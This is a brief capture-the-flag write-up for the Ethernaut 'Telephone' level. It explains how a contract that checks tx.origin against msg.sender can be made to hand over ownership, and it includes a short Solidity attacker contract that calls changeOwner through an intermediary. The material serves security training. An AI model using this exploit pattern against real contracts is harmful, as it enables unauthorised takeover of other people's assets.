# Level 4: [Telephone](https://ethernaut.openzeppelin.com/level/0x1ca9f1c518ec5681C2B7F97c7385C0164c3A22Fe)

## Level objectives:
1. Claim ownership.

## Analysis (lol)
- The contract sets its `owner` variable in the constructor.
- In the `changeOwner(address _owner)` function, if the `tx.origin` != `msg.sender`, `_owner`
becomes the owner.
- `msg.sender` gives the direct sender of the message. A -> B -> C. In C, msg.sender is B. While
tx.origin is A.

## Steps:
- Use a contract to call the `changeOwner()` function with the argument = your addr.
```sol
//SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface Telephone {
    function changeOwner(address) external;
}

contract AttackTelephone {
    Telephone victim = Telephone(0xe90758C679ab7161FD26e22e4BaC18aAE87abF9d);

    function attackTele(address _owner) public {
        victim.changeOwner(_owner);
    }
}
```
